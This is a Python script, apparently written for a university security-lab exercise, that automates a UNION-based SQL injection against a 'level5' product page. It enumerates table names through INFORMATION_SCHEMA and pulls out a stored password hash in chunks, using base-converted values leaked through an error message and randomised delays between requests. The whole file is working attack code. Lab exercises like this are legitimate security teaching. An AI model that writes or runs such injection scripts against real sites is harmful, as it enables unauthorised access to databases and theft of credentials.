import pprint
import requests
import time
from random import randint
from baseconvert import BaseConverter

#########################################################################
# BEGIN CONFIG
# ONLY MODIFY THE FOLLOWING FEW LINES!
# The table_list should be empty if not used (e.g. table_list1 = []).
#########################################################################
port = 2680
table_list1 = []
table_list2 = []
#########################################################################
# END CONFIG
#########################################################################


domain = 'http://seclab1.win.tue.nl:' + str(port) + '/level5/index.php'
b = BaseConverter(input_base=10, output_base=32)
switcher = {
    10: "a",
    11: "b",
    12: "c",
    13: "d",
    14: "e",
    15: "f",
}


def value_in_between(web_page, identifier, deidentifier):
    start = web_page.find(identifier)
    start += len(identifier)
    end = web_page.find(deidentifier, start)
    # print(web_page[start:end])
    return web_page[start:end]


def convert_base(string):
    base_array = b(string)
    base_result = ''
    for base_int in base_array:
        if int(base_int) < 10:
            base_result += str(base_int)
        else:
            base_result += switcher.get(int(base_int))
    # print(base_result)
    return base_result


if len(table_list1) == 0:
    for tables in range(0, 1):
        total_database_table_string = ''
        for substring in range(1, 33, 10):
            url = domain + '?id=-1 UNION SELECT CONV(SUBSTRING(table_name,' + str(substring) + ',10), 32, 10), 2, 3 ' \
                           'FROM INFORMATION_SCHEMA.COLUMNS WHERE column_name=0x68617368 LIMIT 1 OFFSET ' + str(tables)
            r = requests.get(url)
            page_text = r.text
            base_10_value = value_in_between(page_text, 'There are no products with id: [', ']')
            base_16_value = convert_base(base_10_value)
            total_database_table_string += base_16_value
            time.sleep(randint(1, 40)/20)
        table_list1.append(total_database_table_string)
        print('Database name:{}'.format(total_database_table_string))

    print('All tables found the first time:')
    pprint.pprint(table_list1)
    print('Please restart your server now. Press enter when done.')
    input()


table_with_hash = table_list1[0]

print('Table with hash is : {}'.format(table_with_hash))

hash_string = ''
for substring in range(1, 33, 10):
    url = domain + '?id=-1 UNION SELECT CONV(SUBSTRING(hash,' + str(substring) + ',10), 32, 10), 2, 3 FROM '\
          + str(table_with_hash)
    r = requests.get(url)
    page_text = r.text
    base_10_value = value_in_between(page_text, 'There are no products with id: [', ']')
    base_16_value = convert_base(base_10_value)
    hash_string += base_16_value
    time.sleep(randint(1, 40) / 20)
print('Found hash value:{}'.format(hash_string))
